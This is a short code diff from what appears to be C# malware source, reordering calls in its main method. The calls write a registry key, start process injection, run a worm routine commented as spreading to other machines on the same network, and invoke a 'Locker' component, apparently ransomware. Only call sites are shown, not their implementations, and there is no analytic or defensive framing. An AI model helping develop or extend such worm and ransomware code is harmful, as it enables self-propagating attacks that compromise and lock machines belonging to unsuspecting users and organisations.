@@ -10,11 +10,12 @@ public class Program
     {
         RegEdit.Write();
         // call the write function to write registry key to the registry
-
+        ProcInj.ProcStart();
+        
         Worms.Entrypoint(args[1]);
         // attempt to spread itself to other machines on the same network.
         
-        ProcInj.ProcStart();
+        
 
         Locker.Pos();
 
